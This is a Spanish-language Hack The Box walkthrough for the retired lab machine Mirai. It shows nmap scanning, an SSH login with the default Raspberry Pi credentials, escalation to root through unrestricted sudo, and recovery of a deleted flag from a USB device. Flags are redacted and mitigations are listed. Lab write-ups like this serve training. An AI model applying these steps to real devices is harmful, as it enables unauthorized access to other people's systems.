---
machine: Mirai
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, raspberry-pi, pihole, plex, default-credentials, deleted-file, usb]
---

# Mirai — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un dispositivo Raspberry Pi con Pi-hole y Plex conserva las credenciales por defecto de Raspberry Pi. El usuario `pi` puede ejecutar cualquier comando con `sudo`. La flag de root fue borrada de un USB montado; se recupera del dispositivo en crudo con `grep`, `strings` o `extundelete`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,53,80,1877,32400,32469 <IP>
```

- 22 SSH, 53 DNS, 80 HTTP, 1877 y 32469 UPnP, 32400 Plex.
- `X-Pi-hole` en las respuestas HTTP y `/admin` confirman Pi-hole.
- Plex se presenta en 32400.

## Enumeración

```bash
curl -sI http://<IP>/
curl -s http://<IP>/admin/ | head
```

- Pi-hole no tiene credenciales por defecto, pero el sistema operativo sí.
- La versión de OpenSSH sugiere Debian 8.
- No se encuentra un vector web directo; el dispositivo es el objetivo.

## Foothold

La imagen oficial de Raspberry Pi mantiene `pi` / `raspberry` si no se cambia. Esas credenciales funcionan por SSH.

```bash
ssh pi@<IP>
id
cat ~/Desktop/user.txt
```

La flag de usuario se lee; se redacta en esta ficha.

## Escalada de privilegios

`sudo -l` muestra permisos totales sin contraseña:

```bash
sudo -l
sudo -i
```

`/root/root.txt` no contiene la flag, sino una nota sobre un backup en un USB. `mount` y `lsblk` muestran `/dev/sdb` montado en `/media/usbstick`; el archivo `damnit.txt` confirma que la flag fue borrada.

```bash
mount | grep usb
ls -la /media/usbstick
```

La flag se recupera del dispositivo en crudo:

```bash
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
# o
strings /dev/sdb -n 32
```

También se puede copiar la imagen y usar `extundelete`:

```bash
dd if=/dev/sdb of=usb.img
extundelete usb.img --restore-all
cat RECOVERED_FILES/root.txt
```

## Evidencia

- `id` y `sudo -l` como `pi`.
- Nota de `/root/root.txt` y salida de `mount`.
- Recuperación con `strings` o `extundelete`, con la flag redactada.

## Lecciones aprendidas

- Los dispositivos IoT suelen conservar credenciales de fábrica.
- `sudo ALL` convierte una cuenta de usuario en root directo.
- Borrar un archivo no elimina sus datos del dispositivo.

## Mitigaciones y detección

- Cambiar la contraseña de `pi` y deshabilitar el usuario por defecto.
- Restringir `sudo` y separar los servicios del usuario del sistema.
- Cifrar unidades extraíbles y no almacenar secretos en ellas.
- Alertar de inicios de sesión con `pi`, `sudo` interactivo y montajes USB no previstos.

## Referencias

- <https://www.hackthebox.com/machines/Mirai>
- <https://www.raspberrypi.com/documentation/computers/configuration.html>
- <https://attack.mitre.org/techniques/T1078/001/>
- <https://attack.mitre.org/techniques/T1552/>
